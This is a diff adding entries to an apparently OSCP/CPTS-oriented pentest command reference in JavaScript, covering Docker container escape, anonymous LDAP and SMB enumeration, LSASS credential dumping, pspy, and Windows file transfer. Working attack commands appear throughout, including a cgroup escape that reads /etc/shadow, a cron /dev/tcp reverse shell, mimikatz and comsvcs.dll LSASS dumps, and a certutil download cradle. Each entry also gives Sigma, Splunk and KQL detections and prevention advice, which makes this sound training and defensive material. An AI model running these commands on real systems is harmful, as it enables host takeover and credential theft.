@@ -37615,6 +37615,99 @@ const COMMAND_DATA = {
       "explain": "Runs full automated DNS enumeration in one command:\n  dnsenum --dnsserver <nameserver>   query this NS\n  --enum -p 0 -s 0                   preset without whois page/scrape steps\n  -o <outfile> -f <wordlist>         save output; brute-force subdomains from the wordlist\n  <domain>                           target\nDiscovers NS/MX/SOA records, attempts AXFR against every nameserver, and brute-forces subdomains together - a one-shot DNS map."
     },
     {
+      "id": "linux-docker-escape",
+      "name": "Docker Container Escape - Privileged & Socket Abuse",
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "description": "Docker container escapes exploit misconfigurations like privileged mode, mounted Docker socket, excessive capabilities, or host filesystem mounts. If you land in a container, these techniques break out to the host. The Docker socket mount is the most common escape vector in CTFs and real environments.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Container Escape",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Docker security; container escape methodology",
+      "tags": [
+        "docker",
+        "container-escape",
+        "privileged",
+        "docker-socket",
+        "breakout",
+        "mount",
+        "capabilities"
+      ],
+      "mitre": [
+        "T1611"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AM I IN A CONTAINER? ===\n  # Check indicators:\n  cat /proc/1/cgroup | grep docker\n  ls -la /.dockerenv\n  hostname  # Random hex = container\n  cat /proc/self/mountinfo | grep docker\n\n=== DOCKER SOCKET ESCAPE ===\n  # If /var/run/docker.sock is mounted:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n  # Or without docker CLI:\n  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json\n  # Create container with host mount:\n  curl -s -X POST --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" http://localhost/containers/create -d \"{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/mnt\",\"sh\"],\"Binds\":[\"/:/mnt\"],\"Tty\":true}\"\n\n=== PRIVILEGED MODE ESCAPE ===\n  # If running --privileged:\n  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n  echo 1 > /tmp/cgrp/x/notify_on_release\n  host_path=$(sed -n \"s/.*\\perdir=\\([^,]*\\).*/\\1/p\" /etc/mtab)\n  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n  echo \"#!/bin/sh\" > /cmd\n  echo \"cat /etc/shadow > $host_path/output\" >> /cmd\n  chmod a+x /cmd\n  sh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\"\n  cat /output\n\n=== CAPABILITIES ABUSE ===\n  # Check capabilities:\n  capsh --print\n  # CAP_SYS_ADMIN: mount host filesystem\n  # CAP_SYS_PTRACE: attach to host processes\n  # CAP_NET_ADMIN: manipulate host networking\n\n=== HOST PID NAMESPACE ===\n  # If --pid=host:\n  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n\n=== WRITABLE HOST MOUNT ===\n  # If host dirs are mounted:\n  # Write SSH key:\n  echo \"ssh-rsa AAA...\" >> /host_mount/root/.ssh/authorized_keys\n  # Write cron job:\n  echo \"* * * * * root bash -i >& /dev/tcp/<ip>/<port> 0>&1\" >> /host_mount/etc/crontab",
+      "examples": [
+        {
+          "label": "Escape via Docker socket",
+          "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        },
+        {
+          "label": "Check if in container",
+          "command": "cat /proc/1/cgroup | grep docker && ls /.dockerenv"
+        },
+        {
+          "label": "Escape via host PID namespace",
+          "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Docker Breakout",
+          "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout"
+        },
+        {
+          "title": "MITRE T1611 - Escape to Host",
+          "url": "https://attack.mitre.org/techniques/T1611/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "k8s-privileged-pod",
+          "note": "Kubernetes privileged pod escape for K8s environments.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Privileged containers share the host kernel and have full access to host devices. Mounted Docker sockets allow creating new containers with host access. Excessive capabilities grant kernel-level operations.",
+        "prerequisites": "Shell inside a misconfigured container (privileged, socket mounted, or excessive capabilities).",
+        "impact": "Full host access from within a container; root on the host system.",
+        "detection": "[MITRE T1611] New container creation with host mounts; privileged container execution; nsenter/chroot from container context.",
+        "artifacts": "Docker daemon logs showing host volume mounts; container creation events; nsenter process execution.",
+        "splunk_spl": "index=linux (sourcetype=docker OR sourcetype=syslog) (\"--privileged\" OR \"docker.sock\" OR \"nsenter\" OR \"chroot /mnt\")\n| table _time, host, process, message",
+        "elastic_kql": "process.name:(\"nsenter\" OR \"chroot\") OR process.args:(\"docker.sock\" OR \"--privileged\")",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"nsenter\", \"chroot /mnt\", \"docker.sock\", \"--privileged\")\n| project TimeGenerated, HostName, SyslogMessage",
+        "sigma_rules": "linux_docker_container_escape",
+        "prevention": "Never run containers in privileged mode; do not mount Docker socket; use rootless containers; drop unnecessary capabilities; use gVisor/Kata containers.",
+        "sources": [
+          "Docker security",
+          "https://attack.mitre.org/techniques/T1611/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Docker container escape attempt",
+            "logic": "title: Docker Container Escape via nsenter or Socket\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection_nsenter:\n    Image|endswith: /nsenter\n    CommandLine|contains: \"--target 1\"\n  selection_socket:\n    CommandLine|contains:\n      - \"docker.sock\"\n      - \"chroot /mnt\"\n  condition: selection_nsenter or selection_socket\nlevel: critical",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1611"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate container management tools; orchestrator health checks",
+            "tuning": "Any nsenter targeting PID 1 from within a container is almost certainly an escape attempt"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -74499,6 +74592,106 @@ const COMMAND_DATA = {
       },
       "type": "command",
       "explain": "Recovers locally stored application passwords with LaZagne:\n  LaZagne.exe all          run every module (browsers, mail clients, Wi-Fi, sysadmin tools, LSA secrets)\nAdd -vv for verbose output. It reads each app's own credential store in the current user's context; the Linux build (laZagne.py) covers Linux stores."
+    },
+    {
+      "id": "recon-ldap-anonymous",
+      "name": "LDAP Anonymous Bind - Unauthenticated AD Enumeration",
+      "command": "ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=user)\" sAMAccountName",
+      "description": "LDAP anonymous bind allows querying Active Directory without credentials when enabled. While disabled by default on modern Windows Server, it is commonly found in legacy environments. Exposes users, groups, OUs, GPOs, and other AD objects to unauthenticated attackers.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Reconnaissance",
+      "subcategory": "LDAP Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "LDAP enumeration methodology",
+      "tags": [
+        "ldap",
+        "anonymous-bind",
+        "enumeration",
+        "active-directory",
+        "unauthenticated",
+        "ldapsearch"
+      ],
+      "mitre": [
+        "T1087.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TEST ANONYMOUS BIND ===\n  # Check if anonymous bind works:\n  ldapsearch -x -H ldap://<dc_ip> -b \"\" -s base namingContexts\n  # If it returns naming contexts, anonymous bind is enabled\n\n=== ENUMERATE BASE DN ===\n  ldapsearch -x -H ldap://<dc_ip> -b \"\" -s base defaultNamingContext\n\n=== ENUMERATE USERS ===\n  ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=user)\" sAMAccountName userPrincipalName\n  # Specific attributes:\n  ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=user)\" sAMAccountName description memberOf\n\n=== ENUMERATE GROUPS ===\n  ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=group)\" cn member\n\n=== ENUMERATE COMPUTERS ===\n  ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=computer)\" dNSHostName operatingSystem\n\n=== TOOLS ===\n  # windapsearch (Python):\n  windapsearch -d <domain> --dc-ip <dc_ip> -U  # Users\n  windapsearch -d <domain> --dc-ip <dc_ip> -G  # Groups\n  windapsearch -d <domain> --dc-ip <dc_ip> -C  # Computers\n  # enum4linux-ng:\n  enum4linux-ng -A <dc_ip>\n  # nmap LDAP scripts:\n  nmap -p 389 --script ldap-rootdse,ldap-search <dc_ip>",
+      "examples": [
+        {
+          "label": "Test anonymous bind",
+          "command": "ldapsearch -x -H ldap://192.168.1.10 -b \"\" -s base namingContexts"
+        },
+        {
+          "label": "Enumerate users anonymously",
+          "command": "ldapsearch -x -H ldap://192.168.1.10 -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName"
+        },
+        {
+          "label": "windapsearch user enum",
+          "command": "windapsearch -d corp.local --dc-ip 192.168.1.10 -U"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - LDAP Enumeration",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"
+        },
+        {
+          "title": "MITRE T1087.002",
+          "url": "https://attack.mitre.org/techniques/T1087/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-ldeep",
+          "note": "ldeep for authenticated deep LDAP enumeration.",
+          "rel": "next"
+        },
+        {
+          "id": "recon-smb-null-session",
+          "note": "SMB null session for complementary anonymous enumeration.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "LDAP anonymous bind allows unauthenticated LDAP queries. When enabled, the DC responds to queries without requiring credentials, exposing the full directory.",
+        "prerequisites": "LDAP port (389/636) accessible; anonymous bind enabled on DC.",
+        "impact": "Unauthenticated enumeration of all AD objects: users, groups, computers, OUs, GPOs.",
+        "detection": "[MITRE T1087.002] LDAP connections without authentication; large LDAP query result sets from unauthenticated sessions.",
+        "artifacts": "LDAP connection logs; Event 2889 (unsigned LDAP bind); anonymous bind audit events.",
+        "splunk_spl": "index=windows EventCode=2889\n| where ClientAddress!=\"127.0.0.1\"\n| stats count by ClientAddress\n| where count > 10",
+        "elastic_kql": "event.code:\"2889\" AND NOT source.ip:\"127.0.0.1\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 2889\n| where ClientIPAddress != \"127.0.0.1\"\n| summarize QueryCount=count() by ClientIPAddress, bin(TimeGenerated, 5m)\n| where QueryCount > 10",
+        "sigma_rules": "win_ldap_anonymous_bind_access",
+        "prevention": "Disable anonymous LDAP bind via GPO; require LDAP signing; restrict LDAP access to authenticated users; monitor LDAP connections.",
+        "sources": [
+          "LDAP security",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LDAP anonymous bind enumeration",
+            "logic": "SecurityEvent\n| where EventID == 2889\n| where ClientIPAddress != \"127.0.0.1\"\n| summarize QueryCount=count() by ClientIPAddress, bin(TimeGenerated, 5m)\n| where QueryCount > 5\n| project TimeGenerated, ClientIPAddress, QueryCount",
+            "data_source": "windows-security",
+            "log_ids": [
+              "2889"
+            ],
+            "attack": [
+              "T1087.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legacy applications using anonymous LDAP; monitoring tools",
+            "tuning": "Alert on any non-whitelisted IP performing anonymous LDAP queries"
+          }
+        ]
+      }
     },
     {
       "type": "payload",
@@ -123023,6 +123216,104 @@ const COMMAND_DATA = {
       "explain": "Escapes to host root via lxd/lxc group by launching a privileged container:\n  lxc init <image> r00t    create a container named r00t from an imported image\n  -c security.privileged=true   run it privileged (no UID remapping)\nThen lxc config device add mounts the host / into it, and lxc exec drops you into a shell with root read/write of the host filesystem under /mnt/root."
     },
     {
+      "id": "post-procdump-lsass",
+      "name": "ProcDump / comsvcs.dll - LSASS Memory Dump",
+      "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+      "description": "LSASS memory dumps capture plaintext passwords, NTLM hashes, and Kerberos tickets from the Local Security Authority Subsystem Service. ProcDump (Sysinternals), comsvcs.dll (built-in), and Task Manager are common methods. The dump is analyzed offline with mimikatz or pypykatz.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "LSASS credential dumping methodology",
+      "tags": [
+        "procdump",
+        "lsass",
+        "credential-dump",
+        "comsvcs",
+        "mimikatz",
+        "pypykatz",
+        "minidump"
+      ],
+      "mitre": [
+        "T1003.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== METHOD 1: PROCDUMP (Sysinternals - signed) ===\n  procdump.exe -accepteula -ma lsass.exe lsass.dmp\n  # Signed by Microsoft, less likely to be flagged\n\n=== METHOD 2: COMSVCS.DLL (built-in LOLBin) ===\n  # Find LSASS PID:\n  tasklist | findstr lsass\n  # Dump using rundll32:\n  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full\n  # Or via PowerShell:\n  Get-Process lsass | ForEach-Object { rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $_.Id C:\\temp\\lsass.dmp full }\n\n=== METHOD 3: TASK MANAGER ===\n  # Right-click lsass.exe -> Create dump file\n  # Saves to %TEMP%\\lsass.DMP\n\n=== METHOD 4: MIMIKATZ (direct) ===\n  mimikatz# privilege::debug\n  mimikatz# sekurlsa::logonpasswords\n  # Or dump to file:\n  mimikatz# sekurlsa::minidump lsass.dmp\n  mimikatz# sekurlsa::logonpasswords\n\n=== OFFLINE ANALYSIS ===\n  # Transfer dump to attacker, then:\n  # pypykatz (Python):\n  pypykatz lsa minidump lsass.dmp\n  # mimikatz:\n  mimikatz# sekurlsa::minidump lsass.dmp\n  mimikatz# sekurlsa::logonpasswords\n\n=== CREDENTIAL GUARD BYPASS ===\n  # If Credential Guard is enabled, LSASS dump will be mostly empty\n  # Check: tasklist | findstr LsaIso\n  # LsaIso.exe running = Credential Guard active",
+      "examples": [
+        {
+          "label": "ProcDump LSASS",
+          "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+        },
+        {
+          "label": "comsvcs.dll dump",
+          "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full"
+        },
+        {
+          "label": "Offline analysis with pypykatz",
+          "command": "pypykatz lsa minidump lsass.dmp"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1003.001 - LSASS Memory",
+          "url": "https://attack.mitre.org/techniques/T1003/001/"
+        },
+        {
+          "title": "ProcDump - Sysinternals",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sedebug-lsass-dump",
+          "note": "SeDebugPrivilege-based LSASS dumping techniques.",
+          "rel": "alternative"
+        },
+        {
+          "id": "privesc-sam-dump",
+          "note": "SAM dump for local account hashes (LSASS has domain creds too).",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "LSASS stores credentials in memory for SSO. With SeDebugPrivilege (local admin), the process memory can be dumped. The dump file contains plaintext passwords, NTLM hashes, and Kerberos tickets.",
+        "prerequisites": "Local admin or SYSTEM access; SeDebugPrivilege.",
+        "impact": "Plaintext passwords, NTLM hashes, Kerberos tickets for all logged-on users.",
+        "detection": "[MITRE T1003.001] Process access to lsass.exe; ProcDump/comsvcs.dll execution; minidump file creation.",
+        "artifacts": "Process handle to lsass.exe; lsass.dmp files; ProcDump/comsvcs.dll in command line; Event 4688 with sensitive process access.",
+        "splunk_spl": "index=windows (EventCode=4688 AND (CommandLine=\"*procdump*lsass*\" OR CommandLine=\"*comsvcs*MiniDump*\")) OR (EventCode=10 AND TargetImage=\"*lsass.exe*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+        "elastic_kql": "process.args:(*lsass* AND (*procdump* OR *MiniDump* OR *comsvcs*))",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has_any (\"procdump\", \"comsvcs\") and ProcessCommandLine has \"lsass\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_lsass_dump_procdump",
+        "prevention": "Enable Credential Guard; Credential Guard with UEFI lock; enable LSA protection (RunAsPPL); EDR monitoring for LSASS access.",
+        "sources": [
+          "LSASS security",
+          "https://attack.mitre.org/techniques/T1003/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LSASS credential dump via ProcDump or comsvcs.dll",
+            "logic": "DeviceProcessEvents\n| where (FileName in~ (\"procdump.exe\", \"procdump64.exe\") and ProcessCommandLine has \"lsass\")\n  or (FileName == \"rundll32.exe\" and ProcessCommandLine has_all (\"comsvcs\", \"MiniDump\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1003.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate crash dump collection by IT support",
+            "tuning": "Any LSASS dump by non-IT users is extremely suspicious; correlate with lateral movement"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -124073,6 +124364,98 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Gets a SYSTEM shell on a remote host using a Kerberos ticket (pass-the-ticket):\n  psexec.py                impacket's service-based remote execution\n  <domain>/<user>@<target_fqdn>   the account and target (FQDN required for Kerberos)\n  -k                       authenticate with the ticket in KRB5CCNAME\n  -no-pass                 do not prompt for a password\n  -target-ip <target_ip>   resolve the host to this IP\nUsed after an ExtraSids golden ticket or NoPac; wmiexec/smbexec are quieter alternatives with the same -k -no-pass."
+    },
+    {
+      "id": "linux-pspy",
+      "name": "pspy - Unprivileged Linux Process Monitoring",
+      "command": "./pspy64",
+      "description": "pspy monitors Linux processes in real-time without root. Uses inotify on /proc to detect new processes, including cron jobs and other users processes. Essential for discovering scheduled tasks, running services, and credential exposure in process arguments. The go-to tool for finding privesc via cron jobs.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Post-Exploitation",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "DominicBreuker/pspy",
+      "tags": [
+        "pspy",
+        "process-monitor",
+        "cron",
+        "linux-enum",
+        "privesc",
+        "scheduled-tasks"
+      ],
+      "mitre": [
+        "T1057"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DOWNLOAD ===\n  # Pre-compiled binaries:\n  # 64-bit: pspy64\n  # 32-bit: pspy32\n  # Small versions: pspy64s, pspy32s\n\n=== BASIC USAGE ===\n  chmod +x pspy64\n  ./pspy64\n  # Monitors all processes in real-time\n  # Watch for cron jobs, backup scripts, etc.\n\n=== WHAT TO LOOK FOR ===\n  # Cron jobs running as root:\n  # CMD: UID=0  | /bin/bash /opt/backup.sh\n  # Scripts with credentials:\n  # CMD: UID=0  | mysql -u root -pSecretPass\n  # Writable scripts called by root:\n  # CMD: UID=0  | /tmp/cleanup.sh\n  # Services restarting:\n  # CMD: UID=0  | systemctl restart apache2\n\n=== COLOR OUTPUT ===\n  ./pspy64 -pf -i 1000\n  # -pf = print commands AND file system events\n  # -i 1000 = scan every 1 second\n\n=== COMMON PRIVESC PATHS ===\n  1. Root cron job executes writable script -> modify script\n  2. Root cron job uses writable directory -> path hijack\n  3. Credentials visible in process arguments\n  4. Root cron job with wildcard injection opportunity\n  5. Root process loading libraries from writable path",
+      "examples": [
+        {
+          "label": "Monitor all processes",
+          "command": "./pspy64"
+        },
+        {
+          "label": "Monitor with filesystem events",
+          "command": "./pspy64 -pf -i 1000"
+        },
+        {
+          "label": "Small version for constrained environments",
+          "command": "./pspy32s"
+        }
+      ],
+      "references": [
+        {
+          "title": "pspy",
+          "url": "https://github.com/DominicBreuker/pspy"
+        },
+        {
+          "title": "MITRE T1057",
+          "url": "https://attack.mitre.org/techniques/T1057/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gs-privesc-enum",
+          "note": "LinPEAS for comprehensive privesc enumeration; pspy for process monitoring.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "pspy uses Linux procfs and inotify to monitor process creation. Since /proc is readable by all users and inotify watches are unprivileged, no root access is needed to observe all processes.",
+        "prerequisites": "User access on Linux system; pspy binary uploaded.",
+        "impact": "Reveals cron jobs, credentials in process arguments, and running services without root.",
+        "detection": "[MITRE T1057] inotify watches on /proc; pspy binary execution; high-frequency /proc scanning.",
+        "artifacts": "pspy binary on disk; inotify watch creation; /proc directory access patterns.",
+        "splunk_spl": "index=linux sourcetype=syslog process_name=\"pspy*\"\n| table _time, host, user, process",
+        "elastic_kql": "process.name:pspy*",
+        "sentinel_kql": "Syslog\n| where ProcessName has \"pspy\"\n| project TimeGenerated, HostName, ProcessName, SyslogMessage",
+        "sigma_rules": "linux_pspy_process_monitoring",
+        "prevention": "Monitor for pspy binary names; hidepid mount option on /proc; limit inotify watches; restrict binary uploads.",
+        "sources": [
+          "pspy documentation",
+          "https://attack.mitre.org/techniques/T1057/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "pspy process monitoring tool execution",
+            "logic": "title: pspy Process Monitoring Tool\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - /pspy64\n      - /pspy32\n      - /pspy64s\n      - /pspy32s\n  condition: selection\nlevel: high",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1057"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Renamed pspy binary will evade filename detection",
+            "tuning": "Also detect by behavior: high-frequency inotify watches on /proc"
+          }
+        ]
+      }
     },
     {
       "id": "pth-winexe",
@@ -141575,6 +141958,102 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Lists SMB shares on a host with smbclient:\n  smbclient   the SMB client\n  -N          no password (null session)\n  -L \\\\<ip>   list the available shares\nShows what shares exist so you can connect to interesting ones (\\\\<ip>\\<share>) as guest or with -U <user>, then ls/get to pull files."
+    },
+    {
+      "id": "recon-smb-null-session",
+      "name": "SMB Null Session - Anonymous Enumeration",
+      "command": "crackmapexec smb <target> -u \"\" -p \"\" --shares",
+      "description": "SMB null sessions allow anonymous access to shared resources and enumeration of users, groups, shares, and policies without credentials. While less common on modern Windows, null sessions are still found on legacy systems, Linux Samba servers, and misconfigured domain controllers.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Reconnaissance",
+      "subcategory": "SMB Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "SMB enumeration methodology",
+      "tags": [
+        "smb",
+        "null-session",
+        "anonymous",
+        "enumeration",
+        "shares",
+        "users",
+        "enum4linux"
+      ],
+      "mitre": [
+        "T1087.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TEST NULL SESSION ===\n  # CrackMapExec:\n  crackmapexec smb <target> -u \"\" -p \"\"\n  crackmapexec smb <target> -u \"guest\" -p \"\"\n  # smbclient:\n  smbclient -L //<target> -N\n  # rpcclient:\n  rpcclient -U \"\" -N <target>\n\n=== ENUMERATE SHARES ===\n  crackmapexec smb <target> -u \"\" -p \"\" --shares\n  smbclient -L //<target> -N\n  smbmap -H <target> -u \"\" -p \"\"\n\n=== ENUMERATE USERS ===\n  crackmapexec smb <target> -u \"\" -p \"\" --users\n  rpcclient -U \"\" -N <target> -c \"enumdomusers\"\n  enum4linux -a <target>\n  enum4linux-ng -A <target>\n\n=== ENUMERATE GROUPS ===\n  rpcclient -U \"\" -N <target> -c \"enumdomgroups\"\n\n=== ENUMERATE POLICIES ===\n  crackmapexec smb <target> -u \"\" -p \"\" --pass-pol\n  rpcclient -U \"\" -N <target> -c \"getdompwinfo\"\n\n=== RID BRUTE-FORCE ===\n  # If null session works but enumdomusers is blocked:\n  crackmapexec smb <target> -u \"\" -p \"\" --rid-brute 5000\n  # Brutes RIDs 500-5000 to find users\n\n=== DOWNLOAD FILES FROM SHARES ===\n  smbclient //<target>/share -N\n  smb: \\> dir\n  smb: \\> get filename.txt",
+      "examples": [
+        {
+          "label": "Test null session",
+          "command": "crackmapexec smb 10.10.10.100 -u \"\" -p \"\" --shares"
+        },
+        {
+          "label": "Enumerate users via null session",
+          "command": "crackmapexec smb 10.10.10.100 -u \"\" -p \"\" --users"
+        },
+        {
+          "label": "Full enum4linux scan",
+          "command": "enum4linux-ng -A 10.10.10.100"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - SMB Enumeration",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
+        },
+        {
+          "title": "MITRE T1087.002",
+          "url": "https://attack.mitre.org/techniques/T1087/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-cme-shares",
+          "note": "CrackMapExec share enumeration with credentials.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "SMB null sessions exploit the anonymous access feature in Windows networking. When RestrictAnonymous is not properly configured, anonymous users can enumerate shares, users, and domain information.",
+        "prerequisites": "SMB port (445) accessible; null sessions not disabled.",
+        "impact": "Unauthenticated enumeration of domain users, shares, groups, and password policies.",
+        "detection": "[MITRE T1087.002] Anonymous SMB connections; null session logon events (Event 4624 with ANONYMOUS LOGON).",
+        "artifacts": "Event 4624 (ANONYMOUS LOGON); SMB connection logs; enumeration traffic patterns.",
+        "splunk_spl": "index=windows EventCode=4624 TargetUserName=\"ANONYMOUS LOGON\" LogonType=3\n| stats count by IpAddress, TargetDomainName\n| where count > 5",
+        "elastic_kql": "event.code:\"4624\" AND user.name:\"ANONYMOUS LOGON\" AND winlog.event_data.LogonType:\"3\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName == \"ANONYMOUS LOGON\" and LogonType == 3\n| summarize AttemptCount=count() by IpAddress, bin(TimeGenerated, 5m)\n| where AttemptCount > 5",
+        "sigma_rules": "win_security_smb_null_session_access",
+        "prevention": "Set RestrictAnonymous=1/2 via GPO; disable null sessions; block SMB from untrusted networks; disable guest account.",
+        "sources": [
+          "SMB security",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SMB null session enumeration",
+            "logic": "SecurityEvent\n| where EventID == 4624\n| where TargetUserName == \"ANONYMOUS LOGON\"\n| where LogonType == 3\n| summarize AttemptCount=count(), DistinctTargets=dcount(Computer) by IpAddress, bin(TimeGenerated, 5m)\n| where AttemptCount > 3",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624"
+            ],
+            "attack": [
+              "T1087.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legacy applications using anonymous SMB access; printers",
+            "tuning": "Alert on external IPs performing anonymous enumeration; whitelist known legacy systems"
+          }
+        ]
+      }
     },
     {
       "id": "smb-smbstatus",
@@ -177420,6 +177899,103 @@ const COMMAND_DATA = {
       "explain": "Recursively searches the Windows filesystem for credential and config files with PowerShell:\n  Get-ChildItem -Path C:\\  walk the whole C: drive\n  -Include *.kdbx          match this pattern (here KeePass databases; swap for *.pem, web.config, unattend.xml, etc.)\n  -File -Recurse           only files, into every subdirectory\n  -ErrorAction SilentlyContinue   suppress access-denied noise from protected dirs\nThe variations target office docs, SSH keys, web.config connection strings, and sysprep answer files."
     },
     {
+      "id": "transfer-windows-methods",
+      "name": "Windows File Transfer Methods - certutil, bitsadmin, PowerShell",
+      "command": "certutil -urlcache -split -f http://<ip>/<file> C:\\temp\\<file>",
+      "description": "Collection of Windows file transfer techniques using built-in LOLBins. certutil, bitsadmin, and PowerShell download cradles avoid needing to upload additional tools. Critical for transferring payloads, tools, and exfiltrating data during Windows engagements.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "File Transfer",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "LOLBAS; OSCP file transfer methodology",
+      "tags": [
+        "certutil",
+        "bitsadmin",
+        "powershell-download",
+        "file-transfer",
+        "lolbins",
+        "download-cradle"
+      ],
+      "mitre": [
+        "T1105"
+      ],
+      "exam": "exam-ok",
